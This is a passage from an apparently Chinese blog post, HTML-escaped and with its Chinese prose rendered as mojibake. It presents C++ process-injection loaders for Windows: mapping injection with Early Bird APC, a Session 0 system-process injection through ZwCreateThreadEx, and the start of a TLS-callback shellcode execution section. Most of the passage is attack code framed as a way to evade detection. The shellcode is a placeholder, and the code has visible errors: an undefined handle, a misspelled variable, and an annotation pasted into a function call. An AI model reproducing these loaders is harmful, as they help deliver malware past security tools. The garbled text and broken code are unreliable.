class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;pragma&lt;/span&gt; comment (lib, &lt;span class=&#34;string&#34;&gt;&amp;quot;OneCore.lib&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; shellcode[] = &amp;#123;&lt;span class=&#34;number&#34;&gt;0x12&lt;/span&gt;&amp;#125;;  &lt;span class=&#34;comment&#34;&gt;//shellcode&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     STARTUPINFO si = &amp;#123; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     PROCESS_INFORMATION pi = &amp;#123; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     si.cb = &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(STARTUPINFO);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     HANDLE hMapping = &lt;span class=&#34;built_in&#34;&gt;CreateFileMapping&lt;/span&gt;(INVALID_HANDLE_VALUE, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, PAGE_EXECUTE_READWRITE, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(shellcode), &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     LPVOID lpMapAddress = &lt;span class=&#34;built_in&#34;&gt;MapViewOfFile&lt;/span&gt;(hMapping, FILE_MAP_WRITE, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(shellcode));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;memcpy&lt;/span&gt;((PVOID)lpMapAddress, shellcode, &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(shellcode));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;CreateProcessA&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;C:\\Windows\\System32\\notepad.exe&amp;quot;&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, (LPSTARTUPINFOA)&amp;amp;si, &amp;amp;pi);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     LPVOID lpMapAddressRemote = &lt;span class=&#34;built_in&#34;&gt;MapViewOfFile2&lt;/span&gt;(hMapping, pi.hProcess, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, PAGE_EXECUTE_READ);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;QueueUserAPC&lt;/span&gt;((PAPCFUNC)lpMapAddressRemote, pi.hThread, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;ResumeThread&lt;/span&gt;(pi.hThread);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;CloseHandle&lt;/span&gt;(pi.hThread);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;CloseHandle&lt;/span&gt;(hMapping);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;UnmapViewOfFile&lt;/span&gt;(lpMapAddress);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//Mapping Injection + Early Bird&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 å¯ä»¥å’Œå…¶ä»–æ‰‹æ®µç»„åˆï¼Œæ¯”å¦‚ Early Bird æ¥è¾¾åˆ°å¼ºè§„é¿çš„æ•ˆæœ&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Bypass Session 0 Injection (ç³»ç»Ÿè¿›ç¨‹æ³¨å…¥ç»•è¿‡)&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
 æ— æ³•ç›´æ¥å‘ç³»ç»Ÿè¿›ç¨‹å†…æ³¨å…¥ shellcode æˆ–è€… dllï¼ŒåŸå› æ˜¯ R3 çš„ CreateRemoteThread åœ¨ R0 ä¸­çš„å‡½æ•°åŸå‹ ZwCreateThreadEx åœ¨å†…éƒ¨è°ƒç”¨æ—¶ä¼šå°†ç¬¬ä¸ƒä¸ªå‚æ•°è®¾ä¸º 1 å¯¼è‡´ä¼šä½¿æ–°åˆ›å»ºçš„çº¿ç¨‹å¤„äºæŒ‚èµ·çŠ¶æ€ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ¶æ„ shellcode æ— æ³•è¢«æ‰§è¡Œï¼Œåªéœ€è¦å°†ç¬¬ä¸ƒä¸ªå‚æ•°ç½® 0 å³å¯ç»•è¿‡ã€‚&lt;br /&gt;
æ³¨å…¥æµç¨‹ï¼š&lt;br /&gt;
1ã€åˆ©ç”¨å‡½æ•°åŸå‹è‡ªå®šä¹‰ ZwCreateThreadEx å‡½æ•°&lt;br /&gt;
 2ã€é€šè¿‡ç³»ç»Ÿè·å– ntdll.dll å¹¶åŠ è½½ ZwCreateThreadEx å‡½æ•°&lt;br /&gt;
 3ã€ç”³è¯·ä¸€å—å†…å­˜ç©ºé—´å¹¶å°† shellcode å†™å…¥&lt;br /&gt;
 4ã€åˆ©ç”¨ ZwCreateThreadEx å°† shellcode æ³¨å…¥åˆ°ç³»ç»Ÿè¿›ç¨‹ä¸­ï¼Œå°†ç¬¬ä¸ƒä¸ªå‚æ•°ç½® 0&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;ifdef&lt;/span&gt; _WIN64&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;DWORD&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(WINAPI* typedef_ZwCreateThreadEx)&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    PHANDLE ThreadHandle,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    ACCESS_MASK DesiredAccess,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    LPVOID ObjectAttributes,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    HANDLE ProcessHandle,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    LPTHREAD_START_ROUTINE lpStartAddress,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    LPVOID lpParameter,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    ULONG CreateThreadFlags,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    SIZE_T ZeroBits,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    SIZE_T StackSize,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    SIZE_T MaximumStackSize,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    LPVOID pUnkown)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;DWORD&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(WINAPI* typedef_ZwCreateThreadEx)&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    PHANDLE ThreadHandle,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    ACCESS_MASK DesiredAccess,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    LPVOID ObjectAttributes,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    HANDLE ProcessHandle,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    LPTHREAD_START_ROUTINE lpStartAddress,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    LPVOID lpParameter,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    BOOL CreateSuspended,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    DWORD dwStackSize,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    DWORD dw1,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    DWORD dw2,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    LPVOID pUnkown)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* argv[])&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;comment&#34;&gt;//char DllPath[] = &amp;quot;C:\\Users\\Black Sheep\\source\\repos\\sesion0\\x64\\Debug\\TestDll.dll&amp;quot;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; shellcode[] = &amp;#123;&lt;span class=&#34;number&#34;&gt;0x12&lt;/span&gt;&amp;#125;   &lt;span class=&#34;comment&#34;&gt;//shellcode&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     HANDLE hRemoteThread;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    HANDLE hNtModule = &lt;span class=&#34;built_in&#34;&gt;GetModuleHandleA&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;ntdll.dll&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    typedef_ZwCreateThreadEx ZwCreateThreadEx = &lt;span class=&#34;built_in&#34;&gt;GetProcAddress&lt;/span&gt;(hNtModule, &lt;span class=&#34;string&#34;&gt;&amp;quot;ZwCreateThreadEx&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    HANDLE hProcess = &lt;span class=&#34;built_in&#34;&gt;OpenProcess&lt;/span&gt;(PROCESS_ALL_ACCESS, FALSE, &lt;span class=&#34;number&#34;&gt;1516&lt;/span&gt;(ç³»ç»Ÿè¿›ç¨‹pid));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    LPVOID lpBaseeAddresss = (LPVOID)&lt;span class=&#34;built_in&#34;&gt;VirtualAllocEx&lt;/span&gt;(pi.hProcess, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0X1000&lt;/span&gt;, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;WriteProcessMemory&lt;/span&gt;(hProcess, lpBaseAddress, shellcode, &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(shellcode), &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;ZwCreateThreadEx&lt;/span&gt;(&amp;amp;hRemoteThread, PROCESS_ALL_ACCESS, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, hProcess, (LPTHREAD_START_ROUTINE)lpBaseAddress, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;built_in&#34;&gt;CloseHandle&lt;/span&gt;(hRemoteThread);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;CloseHandle&lt;/span&gt;(hProcess);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;FreeLibrary&lt;/span&gt;(hNtModule);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;TLS Code Execute (TLS ä»£ç æ‰§è¡Œ)&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
 çº¿ç¨‹å±€éƒ¨å­˜å‚¨ï¼ˆThread Local Storageï¼ŒTLSï¼‰ç”¨æ¥å°†æ•°æ®ä¸ä¸€ä¸ªæ­£åœ¨æ‰§è¡Œçš„æŒ‡å®šçº¿ç¨‹å…³è”èµ·æ¥ï¼Œå…¶æä¾›äº†å›è°ƒå‡½æ•°å› æ­¤å¯ä»¥åˆ©ç”¨è¯¥å‡½æ•°è¾¾åˆ°æ‰§è¡Œ shellcode çš„æ•ˆæœï¼Œä¸»è¦ç¼–å†™çš„æ˜¯ Reason å…¶è§„å®šå’Œ dll è°ƒç”¨æ—¶ä¸€æ ·&lt;strong&gt; DLL_PROCESS_ATTACH&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span 